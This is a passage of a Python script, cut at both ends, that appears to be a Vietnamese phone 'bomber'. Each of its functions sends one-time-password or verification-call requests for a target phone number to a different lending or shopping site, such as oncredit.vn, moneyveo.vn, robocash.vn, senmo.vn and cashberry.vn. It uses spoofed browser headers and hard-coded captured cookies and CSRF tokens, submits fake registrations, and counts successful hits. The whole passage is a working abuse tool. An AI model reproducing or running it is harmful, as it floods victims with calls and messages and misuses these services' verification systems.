    headers = {'authority': 'api.thantaioi.vn','accept': '*/*','accept-language': 'vi','content-type': 'application/json','dnt': '1','origin': 'https://thantaioi.vn','referer': 'https://thantaioi.vn/user/login','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',}
    json_data = {'phone': phone,}
    response = requests.post('https://api.thantaioi.vn/api/user/send-one-time-password',cookies=cookies,headers=headers,json=json_data )
    if 'call' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#call 3
def call2(phone):
    
    global thanhcong
    global thatbai
    mail=random_string(6)+'@gmail.com'
    cookies = {
        'OnCredit_id': '64f285e6b84e09.95319494',
        'GN_USER_ID_KEY': '76352b26-ab4e-4dcb-8456-bb2b37c9116c',
        'SN5c8116d5e6183': 'q5ajk1880v3ts0sphmiok8dr3j',
        '_gid': 'GA1.2.188629515.1694097585',
        '_gat_UA-139625802-1': '1',
        '_hjSessionUser_1876820': 'eyJpZCI6Ijg0ZGNlMWQzLWE0MzQtNWM2MS1iNmE0LWU3ZDY4N2E1ZjBkYSIsImNyZWF0ZWQiOjE2OTM2MTU2MDM1NDAsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjIncludedInSessionSample_1876820': '0',
        '_hjSession_1876820': 'eyJpZCI6ImVkOGQ1YWQxLTMzZmYtNDVkNi04NjA4LWZkNWIxMzU1MWQwMyIsImNyZWF0ZWQiOjE2OTQwOTc1ODU4MDQsImluU2FtcGxlIjpmYWxzZX0=',
        'GN_SESSION_ID_KEY': 'c13fdfbe-bcb2-4fae-8cac-33becef1fc6d',
        'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'C7zMfBNg9MTxrK9FSnlb7orx5vPJVmTdNFDiOxtqJ+s=',
        'gravitecOptInBlocked': 'true',
        '_ga': 'GA1.1.2132192097.1693615597',
        '_ga_462Z3ZX24C': 'GS1.1.1694097584.2.1.1694097642.2.0.0',
    }

    headers = {
        'authority': 'oncredit.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'OnCredit_id=64f285e6b84e09.95319494; GN_USER_ID_KEY=76352b26-ab4e-4dcb-8456-bb2b37c9116c; SN5c8116d5e6183=q5ajk1880v3ts0sphmiok8dr3j; _gid=GA1.2.188629515.1694097585; _gat_UA-139625802-1=1; _hjSessionUser_1876820=eyJpZCI6Ijg0ZGNlMWQzLWE0MzQtNWM2MS1iNmE0LWU3ZDY4N2E1ZjBkYSIsImNyZWF0ZWQiOjE2OTM2MTU2MDM1NDAsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample_1876820=0; _hjSession_1876820=eyJpZCI6ImVkOGQ1YWQxLTMzZmYtNDVkNi04NjA4LWZkNWIxMzU1MWQwMyIsImNyZWF0ZWQiOjE2OTQwOTc1ODU4MDQsImluU2FtcGxlIjpmYWxzZX0=; GN_SESSION_ID_KEY=c13fdfbe-bcb2-4fae-8cac-33becef1fc6d; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=C7zMfBNg9MTxrK9FSnlb7orx5vPJVmTdNFDiOxtqJ+s=; gravitecOptInBlocked=true; _ga=GA1.1.2132192097.1693615597; _ga_462Z3ZX24C=GS1.1.1694097584.2.1.1694097642.2.0.0',
        'dnt': '1',
        'origin': 'https://oncredit.vn',
        'referer': 'https://oncredit.vn/registration',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'data[typeData]': 'sendCodeReg',
        'data[phone]': phone,
        'data[email]': mail,
        'data[captcha1]': '1',
        'data[lang]': 'vi',
        'CSRFName': 'CSRFGuard_ajax',
        'CSRFToken': 't55dhDSYSD8D4h7dEn8zskSR3fn4RKiQZrb644t7iaYAnA8Di4FzEtrdhAeYh6hi',
    }

    response = requests.post('https://oncredit.vn/?ajax', cookies=cookies, headers=headers, data=data)
    if 'OK' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#call 4
def call3(phone):
    def Random_string(length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for _ in range(length))
    global thatbai
    global thanhcong
    head = {"Host": "moneyveo.vn","accept": "*/*","x-requested-with": "XMLHttpRequest","traceparent": "00-" + Random_string(len("c771ff34b940c30df615b678478fce28")) + "-" + Random_string(len("1e0ba42c6725b148")) + "-00","user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","referer": "https://moneyveo.vn/vi/registernew/",}
    response = requests.get("https://moneyveo.vn/vi/registernew/", headers=head)
    ck = response.headers["Set-Cookie"].split(";")[0] + ";"
    data = 'phoneNumber=' + phone
    head = {"Host": "moneyveo.vn","accept": "*/*","x-requested-with": "XMLHttpRequest","traceparent": "00-" + Random_string(len("c771ff34b940c30df615b678478fce28")) + "-" + Random_string(len("1e0ba42c6725b148")) + "-00","user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","referer": "https://moneyveo.vn/vi/registernew/","cookie": ck}
    response = requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/", data=data, headers=head,)
    if '200'in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def moneyveo(phone):
    def Random_string(length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for _ in range(length))
    global thatbai
    global thanhcong
    head = {"Host": "moneyveo.vn","accept": "*/*","x-requested-with": "XMLHttpRequest","traceparent": "00-" + Random_string(len("c771ff34b940c30df615b678478fce28")) + "-" + Random_string(len("1e0ba42c6725b148")) + "-00","user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","referer": "https://moneyveo.vn/vi/registernew/",}
    response = requests.get("https://moneyveo.vn/vi/registernew/", headers=head)
    ck = response.headers["Set-Cookie"].split(";")[0] + ";"
    data = 'phoneNumber=' + phone
    head = {"Host": "moneyveo.vn","accept": "*/*","x-requested-with": "XMLHttpRequest","traceparent": "00-" + Random_string(len("c771ff34b940c30df615b678478fce28")) + "-" + Random_string(len("1e0ba42c6725b148")) + "-00","user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","referer": "https://moneyveo.vn/vi/registernew/","cookie": ck}
    response = requests.post("https://moneyveo.vn/vi/registernew/sendsmsjson/", data=data, headers=head,)
    if '200'in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#call 5
def call4(phone):
    global thanhcong
    global thatbai
    cookies = {'_gcl_au': '1.1.1220684632.1686908084','mousestats_vi': 'b9bd217114711a9d1e4d','_tt_enable_cookie': '1','_ttp': 'DA7mc7Uixiy6xP7mj1rjKm50ltN','_ym_uid': '1686908086798167851','_ym_d': '1686908086','supportOnlineTalkID': 'TwQhuH4Ivv3H9eD0EtQAXMx5Myuu3vyx','jslbrc': 'w.20230616093528211c112e-0c29-11ee-a59e-ee07a4cd7f9b.A_GS','__cfruid': '29d5a9d7c2b2952e6ede5a8a00b88b99cad87e3e-1687066316','_gcl_aw': 'GCL.1687066329.CjwKCAjws7WkBhBFEiwAIi168_RUPpxVovDuocaf4bT80WyTwlJeT0ymjUY-sOiHGOBrwfdKera0eBoCgHQQAvD_BwE','_gid': 'GA1.2.995351727.1687066329','_gac_UA-49883034-25': '1.1687066329.CjwKCAjws7WkBhBFEiwAIi168_RUPpxVovDuocaf4bT80WyTwlJeT0ymjUY-sOiHGOBrwfdKera0eBoCgHQQAvD_BwE','mousestats_si': 'd57e5d5c25fbd471e1a0','_ym_isad': '1','_ym_visorc': 'w','XSRF-TOKEN': 'eyJpdiI6ImVnWUpoLzZxTGRITElHK0N6R3BYVXc9PSIsInZhbHVlIjoiWnBOZzMwOHl4aE15R3BKNEcwSk1Cbkg5eitEYm5NL2RzckI2cHBIMVdUa2ZpK09yOUp3VXVIWjBwQVEvOEM5blRIaWZKSzZnNjk3RW93aEhRT1E0T3JNV0N1NGxLcFZhazFDTjQyZjRqekxEWDJUOUJkMEtjTVdLaXltVGg1YkQiLCJtYWMiOiIwNGI5Y2IyYTE2OWM2NmU5Njc4YTJlNjgwNzRhZDljY2JiMjcxZTVhYmRjOTYxMzM1ZmI4MDA4MTQyOTJkZDAzIiwidGFnIjoiIn0%3D','sessionid': 'eyJpdiI6ImRhTWVBZXVET0wxTWRTdnIzQVhvWWc9PSIsInZhbHVlIjoiejZFenByV2pYcHREZFFpVlBIY1krWDloVEtLZmZsblRBcGVwK2IzMkVxblVwWTM0V3dEcDFVb0txUFVFckQ5bXMyZ2pzTGNDQStYNlhkNHVkVTRWOE1pa0xxQnZrSW9nZzhqMXZOaGtIMjJLdzNkRUllR2cwZXh3OVRlRTFUOWQiLCJtYWMiOiJmN2NkZjQ5YjU2MzFiNjQ4NjZiN2U4ZGFiZWJmNjNjZjA2Mjk5ZTA2NTAxMTUzZTU4MTNiNDA5ZTdkYTkwMDg0IiwidGFnIjoiIn0%3D','utm_uid': 'eyJpdiI6IkFDcHM0UHh1NzhZZTZ5MnphMzR1OWc9PSIsInZhbHVlIjoiTHBoTDdFRjgwOFRWeWdoSkZ4ZWVmT1NhZnk5YjdreWJhZmFpVFcrUFhPc0ROaUtsNEgrSW1DWVM1YTZ3b2RYVjdOZHk1bU1ObFl3WHFGOGdOdjkyZVdkWjZOWnlOTXZESHZ3emJrYml2YkhLNXFCN2RFQWVuQm1HMG5CWlF4aTciLCJtYWMiOiI5M2NkNzY3Mzg2Mzk2MTk3ZTQ3ZjVlMzMzNTZiMTFkMzU3MDIwYjJmNTg1MzhlOWEyOGM1YTBiYTZiZWFiNDlkIiwidGFnIjoiIn0%3D','ec_cache_utm': '6e7c3667-7f57-aeb3-742a-179ed2570f1e','ec_cache_client': 'false','ec_cache_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D','_ga_EBK41LH7H5': 'GS1.1.1687066331.4.1.1687066336.0.0.0','_ga': 'GA1.1.1463404161.1686908084','ec_etag_utm': '6e7c3667-7f57-aeb3-742a-179ed2570f1e','ec_etag_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D','ec_etag_client': 'false','ec_png_utm': '6e7c3667-7f57-aeb3-742a-179ed2570f1e','ec_png_client': 'false','ec_png_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D','_clck': '1v0x9dl|2|fck|0|1262','uid': '6e7c3667-7f57-aeb3-742a-179ed2570f1e','client': 'false','client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocahs%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655651736084%7Ckwmt_p%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D','_clsk': 'pu0t|1687066342104|1|1|t.clarity.ms/collect','amp_6e403e': '206vjTKXep_KxfYKYDBKzV.Ym9kb2lxdWExODlAZ21haWwuY29t..1h36fsjk0.1h36fsjk7.0.3.3',}
    headers = {'authority': 'robocash.vn','accept': '*/*','accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','dnt': '1','origin': 'https://robocash.vn','referer': 'https://robocash.vn/register','sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
    data = {'phone': phone,'_token': 'CutanxfZckD1Qdr73OLBR5qbqSSkssd6aF5W7fm3',}
    response = requests.post('https://robocash.vn/register/phone-resend', cookies=cookies, headers=headers, data=data,)
    if 'success' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#call 8
def call5(phone):
    phone = '0' + phone
    phone = phone.replace('00','')
    phone12 = '+84' + phone
    global thanhcong
    global thatbai
    cookies = {
        '_gid': 'GA1.2.1800927428.1694098157',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1694098157.1.1.1694098180.37.0.0',
        '_ga': 'GA1.2.1546248041.1694098157',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.1800927428.1694098157; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1694098157.1.1.1694098180.37.0.0; _ga=GA1.2.1546248041.1694098157',
        'dnt': '1',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone12,
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

    if 'call' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#call 9
def call6(phone):
    global thanhcong
    global thatbai
    phone = '0' + phone
    phone = phone.replace('00','')
    phone12 = '+84' + phone
    cookies = {
        'i': 'i7KSpvY6wLh5JoCI9s/6Tll0n4L0qJNUZ7cXeA9gPKW1zr49GpIb7J+hzVKcHBAC070jns4R91D2xhyv5FSDtGBz39k=',
        'yandexuid': '5155358581689379632',
        'yuidss': '5155358581689379632',
        'ymex': '2004739632.yrts.1689379632#2004739632.yrtsi.1689379632',
        'yabs-sid': '283065601691759225',
        'bh': 'EkEiTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjExNSIsICJDaHJvbWl1bSI7dj0iMTE1IhoFIng4NiIiECIxMTUuMC41NzkwLjE3MSIqAj8wOgkiV2luZG93cyJCCCIxMC4wLjAiSgQiNjQiUlwiTm90L0EpQnJhbmQiO3Y9Ijk5LjAuMC4wIiwiR29vZ2xlIENocm9tZSI7dj0iMTE1LjAuNTc5MC4xNzEiLCJDaHJvbWl1bSI7dj0iMTE1LjAuNTc5MC4xNzEiIg==',
    }

    headers = {
        'authority': 'mc.yandex.ru',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'text/plain',
        # 'cookie': 'i=i7KSpvY6wLh5JoCI9s/6Tll0n4L0qJNUZ7cXeA9gPKW1zr49GpIb7J+hzVKcHBAC070jns4R91D2xhyv5FSDtGBz39k=; yandexuid=5155358581689379632; yuidss=5155358581689379632; ymex=2004739632.yrts.1689379632#2004739632.yrtsi.1689379632; yabs-sid=283065601691759225; bh=EkEiTm90L0EpQnJhbmQiO3Y9Ijk5IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjExNSIsICJDaHJvbWl1bSI7dj0iMTE1IhoFIng4NiIiECIxMTUuMC41NzkwLjE3MSIqAj8wOgkiV2luZG93cyJCCCIxMC4wLjAiSgQiNjQiUlwiTm90L0EpQnJhbmQiO3Y9Ijk5LjAuMC4wIiwiR29vZ2xlIENocm9tZSI7dj0iMTE1LjAuNTc5MC4xNzEiLCJDaHJvbWl1bSI7dj0iMTE1LjAuNTc5MC4xNzEiIg==',
        'dnt': '1',
        'origin': 'https://senmo.vn',
        'referer': 'https://senmo.vn/user/login',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    }

    data = {
        'wv-data': 'AQFEACsAAJMFjAoAAQJMAQ0AAQNkAhoAAJMFjAoIAGEAcABwAC0AcgBvAG8AdAABBEYDBABNAEEASQBOAG6TBf8DAAEFTAQaAAEGTgUHAFMARQBDAFQASQBPAE4AAQdEBhoQbvIE-wMAAQhMBxoAAQlACBoCW7wC3AOqAQABCkwJIAABC0QKGlu8AtwDTwABDEwLGgABDUQMGlu8AtwDPQABDkQNGlvRAtwDKAABD0wOLwAHDwAABWxvZ2luAAEQQAoaAVurA9wDOwABEUQQD84BqwP3ATsAEeoDDyDtAw-bAxABJv4DAGMQDwAmgwQAZRAPACaIBABnEA8AJowEAGQQDwAmkAQAaRAPACaUBABnEA8AJpgEAGcQDwAmnAQAZBAPACagBABhEA8AJ8AEDwwAMAAzADUAIAA3ADQAOQAgADcANwA0ADEAD8AEEsAEDw7ABBHABBEgwwQRywEaAQvDBAABDw__',
    }

    response = requests.post(
        'https://mc.yandex.ru/webvisor/69597991?wv-part=1&wv-check=57374&wv-type=0&wmode=0&wv-hit=716022824&page-url=https%3A%2F%2Fsenmo.vn%2Fuser%2Flogin&rn=334792583&browser-info=we%3A1%3Aet%3A1691761253%3Aw%3A659x651%3Av%3A1093%3Az%3A420%3Ai%3A20230811204053%3Au%3A1690986546305476536%3Avf%3Aeygqx1x5sixaiiudghr9l27%3Ast%3A1691761253&t=gdpr(14)ti(1)',
        cookies=cookies,
        headers=headers,
        data=data,
        
    )


    cookies = {
        '_ym_uid': '1690986546305476536',
        '_ym_d': '1690986546',
        '_fw_crm_v': '19d680e0-be75-43c3-a520-92c64746565a',
        '_gid': 'GA1.2.938338694.1691761219',
        '_gat_UA-145475427-1': '1',
        '_ym_isad': '1',
        '_ym_visorc': 'w',
        '_ga_C4D01W1NNN': 'GS1.1.1691761218.4.1.1691761228.50.0.0',
        '_ga': 'GA1.1.725989244.1690986546',
        '_ga_SRXSFEV4P2': 'GS1.2.1691761221.4.1.1691761236.45.0.0',
    }

    headers = {
        'authority': 'api.senmo.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_ym_uid=1690986546305476536; _ym_d=1690986546; _fw_crm_v=19d680e0-be75-43c3-a520-92c64746565a; _gid=GA1.2.938338694.1691761219; _gat_UA-145475427-1=1; _ym_isad=1; _ym_visorc=w; _ga_C4D01W1NNN=GS1.1.1691761218.4.1.1691761228.50.0.0; _ga=GA1.1.725989244.1690986546; _ga_SRXSFEV4P2=GS1.2.1691761221.4.1.1691761236.45.0.0',
        'dnt': '1',
        'origin': 'https://senmo.vn',
        'referer': 'https://senmo.vn/user/login',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone12,
    }

    response = requests.post('https://api.senmo.vn/api/user/send-one-time-password', cookies=cookies, headers=headers, json=json_data)
    if "call" in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#khoong chac
def call7(phone):
    global thatbai
    global thanhcong
    headers = {
        "Host": "mcredit.com.vn",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://mcredit.com.vn",
        "referer": "https://mcredit.com.vn/",
    }

    data = '"' + phone + '"'
    response = requests.post("https://mcredit.com.vn/api/Customers/requestOTP", data=data, headers=headers)

    if response.text == "call":
        thanhcong+=1
    else:
        thatbai+=1
#call 16
def call8(phone):
    global thanhcong
    global thatbai
    headers = {
        "Host": "mcredit.com.vn",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://mcredit.com.vn",
        "referer": "https://mcredit.com.vn/",
    }

    data = '"' + phone + '"'
    response = requests.post("https://mcredit.com.vn/api/Customers/requestOTP", data=data, headers=headers,)

    if response.text == "":
        thanhcong+=1
    else:
        thatbai+=1
def call9(phone):
    global thanhcong
    global thatbai
    headers = {
        'authority': 'api.itaphoa.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'dnt': '1',
        'origin': 'https://shop.mioapp.vn',
        'referer': 'https://shop.mioapp.vn/',
        'region-code': 'HCM',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    params = {
        'phone': phone,
        'type': 'call',
    }

    response = requests.get('https://api.itaphoa.com/customer/send-gen-otp', params=params, headers=headers)
    if 'true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def call10(phone):
    global thanhcong
    global thatbai
    mk = generate_random_string(20)
    cookies = {
        'cashberry_new_nuxt_front': 'en',
        'site_id': '2b88dbe79a468f0811860f240bc9b706',
        'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'X/mkXrfjzrzdtnp4fDUb53Ndm1mi4ajV8LrzlTvDrRg=',
        '_ga': 'GA1.1.2070259147.1693836320',
        '_lr_hb_-bdwvky%2Fcashberry-vn': '{%22heartbeat%22:1693836322387}',
        '_lr_uf_-bdwvky': '5a624741-93a5-4238-b716-244ab97e3d54',
        'cashberry_culc_a': '1000000',
        'cashberry_culc_p': '10',
        'all_period_values': '10',
        'click_period': '1',
        '_lr_tabs_-bdwvky%2Fcashberry-vn': '{%22sessionID%22:0%2C%22recordingID%22:%225-50963abe-f8f9-4283-95c3-2acdb9ec1d4d%22%2C%22webViewID%22:null%2C%22lastActivity%22:1693836327466}',
        '_ga_53M1222GXQ': 'GS1.1.1693836319.1.1.1693836332.0.0.0',
    }

    headers = {
        'authority': 'cashberry.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en',
        'content-type': 'application/json',
        # 'cookie': 'cashberry_new_nuxt_front=en; site_id=2b88dbe79a468f0811860f240bc9b706; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=X/mkXrfjzrzdtnp4fDUb53Ndm1mi4ajV8LrzlTvDrRg=; _ga=GA1.1.2070259147.1693836320; _lr_hb_-bdwvky%2Fcashberry-vn={%22heartbeat%22:1693836322387}; _lr_uf_-bdwvky=5a624741-93a5-4238-b716-244ab97e3d54; cashberry_culc_a=1000000; cashberry_culc_p=10; all_period_values=10; click_period=1; _lr_tabs_-bdwvky%2Fcashberry-vn={%22sessionID%22:0%2C%22recordingID%22:%225-50963abe-f8f9-4283-95c3-2acdb9ec1d4d%22%2C%22webViewID%22:null%2C%22lastActivity%22:1693836327466}; _ga_53M1222GXQ=GS1.1.1693836319.1.1.1693836332.0.0.0',
        'dnt': '1',
        'origin': 'https://cashberry.vn',
        'referer': 'https://cashberry.vn/en/registration',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'inn': so(9),
        'email': mail,
        'password': mk,
        'password_repeat': mk,
        'agree': True,
        'is_confirmed_kyivstar': 1,
        'email_mailing': 1,
        'registrationActionsReport': {
            'Object_1': {
                'Keypress': 2,
                'Activate': 1,
                'TimeLast': None,
                'TimeAll': None,
                'SymbolFact': 10,
                'Copy': None,
                'Paste': None,
                'Click': 1,
                'Tab': None,
                'BackspaceLast': None,
                'BackspaceAll': None,
                'DelLast': None,
                'DelAll': None,
                'Changes': 1,
                'Error': 17,
            },
            'Object_2': {
                'Keypress': None,
                'Activate': None,
                'TimeLast': None,
                'TimeAll': None,
                'SymbolFact': 17,
                'Copy': None,
                'Paste': None,
                'Click': None,
                'Tab': None,
                'BackspaceLast': None,
                'BackspaceAll': None,
                'DelLast': None,
                'DelAll': None,
                'Changes': None,
                'Error': 8,
            },
            'Object_3': {
                'Activate': 2,
                'TimeLast': 2,
                'TimeAll': 8,
                'SymbolFact': 11,
                'Paste': None,
                'Click': 2,
                'Tab': None,
                'BackspaceLast': None,
                'BackspaceAll': None,
                'DelLast': None,
                'DelAll': None,
                'Changes': 2,
                'Error': None,
            },
            'Object_15': {
                'Keypress': None,
                'Activate': None,
                'TimeLast': None,
                'TimeAll': None,
                'SymbolFact': None,
                'Copy': None,
                'Paste': None,
                'Click': None,
                'Tab': None,
                'BackspaceLast': None,
                'BackspaceAll': None,
                'DelLast': None,
                'DelAll': None,
                'Changes': None,
                'Error': None,
            },
            'Object_41': {
                'Activate': None,
                'Changes': None,
                'Error': None,
            },
        },
    }

    response = requests.post('https://cashberry.vn/proxy/user/register', cookies=cookies, headers=headers, json=json_data)
    if 'true' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def call11(sdt):
    global thanhcong
    global thatbai
    headers = {
        'Host': 'api.kimungvay.co',
        # 'content-length': '73',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://h5.kimungvay.site',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://h5.kimungvay.site/',
        # 'accept-encoding': 'gzip, deflate, br',
